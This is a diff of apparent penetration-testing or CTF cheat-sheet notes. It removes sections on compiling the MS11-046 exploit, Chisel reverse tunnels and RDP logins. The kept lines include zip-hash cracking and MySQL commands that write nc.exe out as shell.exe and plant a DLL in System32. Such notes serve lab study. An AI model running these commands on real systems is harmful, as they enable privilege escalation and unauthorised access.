@@ -983,27 +983,14 @@ First check manually if it's password protected or not
 zip2john sitebackup3.zip > zip.hash
 ```
 
-## compiling
-```bash
-# Cross compile for 32bit windows system
-i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
-```
-
-## Chisel
-```bash
-.\chisel.exe client 192.168.213.128:8000 R:3306:127.0.0.1:3306
-.\chisel.exe client 192.168.213.128:8000 R:1080:socks
-
-```
-
 
 ## MYSQL
 ```bash
 mysql -u root -h 127.0.0.1
 select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
 select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
-
 ```
+
 ## proof.txt
 ```bash
 # When we have a random txt file instead of proof.txt
@@ -1019,12 +1006,6 @@ root.txt                     34
 Get-Content -path hm.txt -stream root.txt
 ```
 
-
-### RDP
-```bash
-rdesktop -u Administrator 192.168.245.165
-xfreerdp /v:192.168.x.x /u:username /p:password
-```
 
 ## Bloodhound-python
 ```bash
